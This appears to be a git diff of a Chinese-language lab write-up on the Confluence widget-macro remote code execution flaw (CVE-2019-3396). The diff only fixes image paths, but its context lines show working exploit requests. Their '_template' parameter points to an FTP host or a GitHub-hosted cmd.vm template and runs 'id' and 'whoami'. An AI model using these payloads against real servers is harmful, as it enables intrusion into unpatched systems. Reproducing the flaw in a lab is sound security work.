@@ -44,15 +44,15 @@ docker-compose up -d
 ```
 
 访问10.20.40.96:8090，开始安装，选择Trial Installation后点击Next：
-![图片](../../../../Confluence_rce_1.png)
+![图片](../../../../img/Confluence_rce_1.png)
 这里需要去申请一个教育版的证书key:
-![图片](../../../../Confluence_rce_2.png)
+![图片](../../../../img/Confluence_rce_2.png)
 选择证书的时候需要注意选择Server版本的：
 
-![图片](../../../../Confluence_rce_3.png)
+![图片](../../../../img/Confluence_rce_3.png)
 
 输入License Key之后点击Next进入下一步，然后就会验证License Key，验证通过后开始安装，安装等待了五分钟，显示以下界面安装成功：
-![图片](../../../../Confluence_rce_4.png)
+![图片](../../../../img/Confluence_rce_4.png)
 
 ### 搭建FTP Server
 这里为了方便我使用python快速搭建FTP Server。
@@ -113,7 +113,7 @@ Content-Length: 195
 {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"ftp://10.20.40.95/cmd.vm","cmd":"id"}}}
 ```
 可以看到下图成功执行了id命令：
-![图片](../../../../Confluence_rce_5.png)
+![图片](../../../../img/Confluence_rce_5.png)
 
 如果觉得FTP服务麻烦的也可以使用https服务，我测试的时候也是可以执行命令的，http服务是不行的。
 Github地址：[https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm](https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm)
@@ -131,7 +131,7 @@ Content-Length: 247
 
 {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm","cmd":"whoami"}}}
 ```
-![图片](../../../../Confluence_rce_6.png)
+![图片](../../../../img/Confluence_rce_6.png)
 
 ## 0x03 指纹
 Confluence有一个非常明显的指纹特征，在响应报文中有两个字段：
